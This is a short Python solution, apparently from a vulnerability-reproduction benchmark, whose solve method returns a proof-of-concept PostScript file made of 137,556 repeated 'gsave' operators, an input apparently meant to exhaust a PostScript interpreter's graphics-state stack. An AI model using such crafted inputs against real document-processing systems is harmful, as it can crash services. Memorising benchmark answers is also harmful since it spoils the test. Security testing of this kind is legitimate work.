class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'%!\n'
        num = 137556
        poc += b'gsave\n' * num
        return poc
